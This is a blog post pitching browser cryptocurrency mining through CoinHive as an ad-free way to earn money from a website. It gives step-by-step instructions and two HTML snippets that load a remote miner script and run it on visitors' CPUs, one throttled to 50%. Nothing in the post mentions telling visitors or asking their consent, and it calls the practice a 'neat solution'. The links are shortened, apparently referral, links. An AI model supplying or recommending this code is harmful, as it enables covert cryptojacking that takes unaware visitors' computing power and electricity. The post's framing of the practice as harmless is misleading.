---
layout: post
title: Monetizing Websites without having to use annoying advertisements! Just use a JavaScript Miner!
---

Have you ever wanted to make a personal website or even a business website that would not require the end user to be annoyed by adverts? If you have, then today is your day!

All you have to do is use a JS Miner from [CoinHive][coinhive].

And adding it to a new or even existing website/webpage is as simple as the following 3 steps.

Step 1: Go to the [CoinHive "Sign Up" page][coinhive] and create your account.

Step 2: Go to the [CoinHive "Settings > Sites" page][coinhive_keys] and get your "Site Key".

Step 3: Add the following code snippet to your webpage/webpages.

```html
<!-- Monetizing visitor traffic -->
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  // What site-key do we use?
  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key

  // Get instance of the miner
  var miner = new CoinHive.Anonymous(key);

  // Start this baby up!
  miner.start();
</script>
```

Take note that there are options to customize the miner for example in this next snippet, we set a 50% throttle for the miner CPU cycles consumed.

```html
<!-- Monetizing visitor traffic -->
<script src="https://coin-hive.com/lib/coinhive.min.js"></script>
<script>
  // What site-key do we use?
  var key = '8HwAd4b7uoIsGeauLI4MFx7udLaTofWm'; // Don't forget to replace this with your own key

  // Get instance of the miner
  var miner = new CoinHive.Anonymous(key, { throttle: 0.5 });

  // Start this baby up!
  miner.start();
</script>
```

If you need more info on the options for the JS miner, then go to the [CoinHive "Documentation" page][coinhive_docs].

## Conclusion

This is a pretty neat solution for getting RID of annoying adverts and keeping the same or even better income for your content or even service related website.

[coinhive]: https://cnhv.co/hro
{:target="_blank"}

[coinhive_keys]: https://cnhv.co/hrn
{:target="_blank"}

[coinhive_docs]: https://cnhv.co/hru
{:target="_blank"}
